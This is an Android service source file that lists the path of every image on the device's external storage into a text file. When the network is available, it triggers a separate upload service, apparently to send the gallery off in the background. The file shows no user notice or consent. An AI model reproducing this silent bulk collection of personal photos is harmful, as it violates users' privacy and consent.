package com.meest.Services.GalUpload;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.meest.meestbhart.utilss.Constant;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


public class GelleryUpload extends Service {

    String fileName = "ImageList.txt";
    String filename2 = "ClickedImageList.txt";
    String prefname = "First";
    File gpxfile;
    File root;
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    String[] projection = {MediaStore.MediaColumns.DATA};
    String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/Camera";

    public GelleryUpload() {
    }

    @Override
    public void onCreate() {
        super.onCreate();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        root = new File(Constant.createOutputPath(GelleryUpload.this));
        sharedPreferences=getSharedPreferences("ISFRIST", Context.MODE_PRIVATE);
        editor=sharedPreferences.edit();

        gpxfile = new File(root, fileName);
        Log.e("Click Image", gpxfile+"");

        boolean first = sharedPreferences.getBoolean(prefname, true);
        if(first){
            fileCreationData(path,fileName,filename2,root.getPath(),prefname);
        }else{
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        if(null != activeNetwork && activeNetwork.isConnectedOrConnecting()) {
            if (gpxfile.exists()) {
                double bytes = gpxfile.length();
                Log.e("Gal Image", bytes+"");
                if (bytes != 0.0 ) {
                    Intent intentcall = new Intent(GelleryUpload.this, GalUploadService.class);
                    intentcall.putExtra("key","GAL");
                    startService(intentcall);
                }else{
                    fileCreationData(path,fileName,filename2,root.getPath(),prefname);
                }
            }
        }
        }

        return super.onStartCommand(intent, flags, startId);
    }

    private void fileCreationData(String path, String fileName, String filename2, String rootpath, String prefname) {



        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        try {
                Cursor cursor = GelleryUpload.this.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null,null, null);
                while (cursor.moveToNext()) {
                    String absolutePathOfImage = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DATA));
                    Log.e("All Path ",absolutePathOfImage);
                    generateNoteOnSD(absolutePathOfImage);

                }
                cursor.close();

        }catch (Exception e){
        }

        editor.putBoolean(prefname, false);
        editor.commit();
    }

    public void generateNoteOnSD(String sBody) {
        try
        {
            FileWriter writer = new FileWriter(gpxfile,true);
            writer.append(  sBody+'\n');
            writer.flush();
            writer.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
